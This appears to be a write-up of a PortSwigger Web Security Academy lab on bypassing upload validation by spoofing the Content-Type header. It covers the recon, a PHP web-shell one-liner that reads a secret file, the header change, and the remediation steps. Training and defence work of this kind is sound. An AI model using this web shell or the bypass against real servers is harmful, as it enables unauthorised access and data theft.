# Web Shell Upload via Content-Type Restriction Bypass

**Platform:** PortSwigger Web Security Academy  
**Category:** Web / File Upload Vulnerabilities  
**Level:** Apprentice  
**Date:** 22.10.2026  
**Status:** ✅ Solved  
**Lab Link:** https://0ae2007c0343458d810e52ea00a1006c.web-security-academy.net/

---

## 1. Objective
Upload a web shell and gain access to `/home/carlos/secret`.

## 2. Reconnaissance
- Credentials `wiener:peter` were provided, logged in.
- Discovered the 'Upload' button for the avatar.
- Intercepted the request with Burp Interceptor while uploading a random image.
- Understood that the site, during validation, only looks at the MIME type in the `Content-Type` header, but does not check the file extension.

## 3. Exploitation
1. Created a file named `exploit.php` and placed the PHP web shell code inside it:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
2. Uploaded it to the site and intercepted the request via Burp Interceptor.
3. Modified the `Content-Type` header:
   ```text
   application/x-php -> image/jpeg
   ```
4. Sent the request and received a positive response.
5. Accessed my uploaded file through the endpoint:
   ```text
   /files/avatars/exploit.php
   ```

**Payloads:**
```text
Web shell: <?php echo file_get_contents('/home/carlos/secret'); ?>
Modified header: application/x-php -> image/jpeg
```

**Why it worked:**  
During upload validation, the server checked the `Content-Type` in the request sent by the user, which is easy to change.

## 4. Result
Web shell uploaded, access gained, flag found, lab solved.

## 5. Key Takeaway & Remediation

**What I learned:**  
The server should validate the upload on the back-end and not trust headers from the request. The `Content-Type` check is unreliable because this header is formed by the client itself (browser or attacker via Burp) and is trivial to spoof. Instead, the server should verify the actual file contents and extension against a whitelist.

**How to protect:**
1. Check the magic bytes of each uploaded file, that is, verify the signature.
2. Use a whitelist of extensions (`.jpg`, `.png`) and disable script execution in the upload directory so that even if a file slips through, it won't be executed.
